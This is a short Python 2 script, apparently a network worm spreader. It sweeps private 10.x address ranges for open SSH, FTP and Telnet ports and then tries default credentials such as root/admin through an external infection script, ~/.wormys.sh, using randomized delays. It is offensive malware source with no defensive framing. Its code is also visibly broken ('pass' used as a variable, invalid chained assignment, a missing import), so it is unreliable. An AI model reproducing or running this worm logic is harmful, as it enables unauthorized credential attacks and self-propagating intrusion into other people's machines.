#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  pyback.py
#  
#  Copyright 2016 DockTownMayor <DockTownMayor@Host>
#  
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#  
#  

# May or may not work.

def sub():
  os.system('echo \"pop box\">~/boxy.log')
  return

def server_Outgoing(argument):
  arguments = argument
  port = argument.port
  address = argument.address
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.settimeout(5)
  try:
    s.connect((address, port))
  except socket.error, exc:
    return 0
  s.close()
  return 1

def main(args):
  sub()
  ij = [10, 20]
  c = 0
  maxWait = 30
  maxTryPerSequence = 2
  command = ""
  pa = [22, 21, 23]
  userlist = ["root","admin","administrater"]
  passlist = ["root", "password", "", "admin"]
  user = ""
  pass = ""
  infectionCode = ["~/.wormys.sh"]
  i = 0, j = 0, p = 0, k = 0, h = 0
  for h in range(0, 2):
    for i in range(0, 254):
      for j in range(0, 254):
        for p in range(0, len(pa)):
          command = ""
          argumentsOutgoing = serverConnectionFunction()
          argumentsOutgoing.port = pa[p]
          argumentsOutgoing.address = "{}.{}.{}.{}".format(ij[0], ij[1], i, j)
          if server_Outgoing(argumentsOutgoing) is 1:
            for k in range(0, maxTryPerSequence):
              user = ""
              pass = ""
              user = userlist[randint(0, len(userlist))]
              pass = passlist[randint(0, len(passlist))]
              command = ""
              if pa[p] is 22:
                command = "{} ssh".format(infectionCode[0])
              elif pa[p] is 21:
                command = "{} ftp".format(infectionCode[0])
              elif pa[p] is 23:
                command = "{} telnet".format(infectionCode[0])
              command = "{} {} {} {}.{}.{}.{}".format(command, user, pass, ij[0], ij[1], i, j)
              
              os.system(command)
              time.sleep(randint(0, maxWait/2))
          time.sleep(randint(0, maxWait/2))
        time.sleep(randint(0, maxWait/2))
    if c is 0:
      c = 1
      ij = [10, 0]
  user = ""
  pass = ""
  command = ""
  return 0
	
if __name__ == '__main__':
    import sys
    import socket
    import os
    import time
    class serverConnectionFunction:
      port = 0
      address = ""
    
    sys.exit(main(sys.argv))
